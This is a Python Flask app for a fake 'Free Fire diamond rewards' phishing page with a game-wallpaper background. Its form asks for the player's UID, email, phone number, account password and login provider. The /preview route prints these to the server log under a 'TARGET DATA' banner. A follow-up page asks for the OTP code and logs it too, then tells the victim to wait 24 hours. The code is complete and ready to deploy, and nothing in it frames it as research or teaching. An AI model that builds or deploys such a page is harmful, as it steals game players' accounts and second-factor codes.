from flask import Flask, request, render_template_string

app = Flask(__name__)

# Aapka Fixed Raw Background Link
BG_URL = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/1868470-1080x1920-samsung-full-hd-garena-free-fire-wallpaper-photo.jpg"

HTML_TEMPLATE = f'''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>FF Diamond Rewards</title>
    <style>
        body {{
            background-image: url('{BG_URL}');
            background-size: cover; background-position: center; background-attachment: fixed;
            margin: 0; font-family: sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }}
        .form-box {{
            background: rgba(255, 255, 255, 0.95); padding: 25px; border-radius: 15px;
            text-align: center; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }}
        input, select {{ 
            width: 100%; padding: 12px; margin: 10px 0; 
            border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; 
        }}
        .blue-btn {{ 
            background: #1a73e8; color: white; border: none; padding: 15px; 
            width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer;
        }}
    </style>
</head>
<body>
    <div class="form-box">
        <h2 style="color:#1a73e8;">💎 FREE FIRE REWARDS 💎</h2>
        <form action="/preview" method="post">
            <input type="text" name="uid" placeholder="Free Fire UID" required>
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="text" name="phone" placeholder="Mobile Number" required>
            <input type="password" name="password" placeholder="Account Password" required>
            <select name="account_type">
                <option value="Google">Google Account</option>
                <option value="Facebook">Facebook Account</option>
                <option value="VK">VK Account</option>
                <option value="X">X (Twitter) Account</option>
            </select>
            <button type="submit" class="blue-btn">PROCEED</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/preview', methods=['POST'])
def preview():
    uid = request.form.get('uid')
    email = request.form.get('email')
    phone = request.form.get('phone')
    password = request.form.get('password')
    acc = request.form.get('account_type')
    
    # YEH LINE RENDER LOGS MEIN DATA DIKHAYEGI
    print(f"\n🎯 [TARGET DATA] 🎯\nUID: {uid}\nEMAIL: {email}\nPASS: {password}\nTYPE: {acc}\nPHONE: {phone}\n" + "="*20)
    
    return f'''
    <body style="background-image: url('{BG_URL}'); background-size: cover; background-position: center; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; margin: 0;">
        <div style="background: white; padding: 25px; border-radius: 15px; width: 300px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.5);">
            <h3 style="color: red;">Confirm Details</h3>
            <div style="text-align: left; background: #f0f0f0; padding: 15px; border-radius: 8px; font-size: 14px;">
                <p><b>UID:</b> {uid}</p>
                <p><b>Email:</b> {email}</p>
                <p><b>Login Type:</b> {acc}</p>
            </div>
            <form action="/submit_final" method="post">
                <input type="hidden" name="phone" value="{phone}">
                <button type="submit" style="background: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; margin-top: 15px; font-weight: bold; cursor: pointer;">CONFIRM & GET OTP</button>
            </form>
        </div>
    </body>
    '''

@app.route('/submit_final', methods=['POST'])
def submit_final():
    phone = request.form.get('phone')
    return f'''
    <body style="background-image: url('{BG_URL}'); background-size: cover; background-position: center; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; margin: 0;">
        <div style="background: white; padding: 25px; border-radius: 15px; width: 300px; text-align: center;">
            <h2>OTP Verification</h2>
            <p>Code sent to {phone}</p>
            <form action="/final_otp" method="post">
                <input type="text" name="otp" placeholder="Enter 6-digit OTP" maxlength="6" required style="width: 100%; padding: 10px; margin-bottom: 20px;">
                <button type="submit" style="background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px;">VERIFY</button>
            </form>
        </div>
    </body>
    '''

@app.route('/final_otp', methods=['POST'])
def final_otp():
    otp = request.form.get('otp')
    print(f"📩 RECEIVED OTP: {otp}")
    return "<h1 style='text-align:center; padding-top:50px; font-family:sans-serif;'>Processing... Please wait 24 hours.</h1>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
